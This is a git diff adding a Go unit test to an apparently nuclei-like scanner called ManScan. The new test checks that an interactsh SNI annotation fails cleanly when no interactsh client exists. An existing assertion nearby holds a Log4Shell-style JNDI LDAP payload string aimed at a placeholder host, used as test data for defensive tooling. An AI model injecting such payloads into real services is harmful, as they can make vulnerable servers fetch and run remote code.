@@ -8,6 +8,7 @@ import (
 
 	"ManScan/internal/tests/testutils"
 	"ManScan/pkg/protocols"
+	commoninteractsh "ManScan/pkg/protocols/common/interactsh"
 	"ManScan/pkg/protocols/http/httpclientpool"
 	"github.com/projectdiscovery/gologger"
 	"github.com/projectdiscovery/retryablehttp-go"
@@ -52,6 +53,25 @@ func TestRequestParseAnnotationsSNI(t *testing.T) {
 		require.True(t, modified, "could not apply request annotations")
 		require.Equal(t, "${jndi:ldap://${hostName}.test.com}", overrides.request.TLS.ServerName)
 		require.Equal(t, "example.com", overrides.request.Host)
+	})
+	t.Run("interactsh-without-client", func(t *testing.T) {
+		req := &Request{
+			options:           &protocols.ExecutorOptions{},
+			connConfiguration: &httpclientpool.Configuration{NoTimeout: true},
+		}
+		rawRequest := `@tls-sni: interactsh-url
+		GET / HTTP/1.1
+		Host: {{Hostname}}`
+
+		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
+		require.NoError(t, err)
+
+		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
+		require.True(t, modified)
+		require.ErrorIs(t, overrides.err, commoninteractsh.ErrInteractshClientNotInitialized)
+		require.Empty(t, overrides.interactshURLs)
+		require.Same(t, httpReq, overrides.request)
+		require.Nil(t, overrides.cancelFunc)
 	})
 }
 
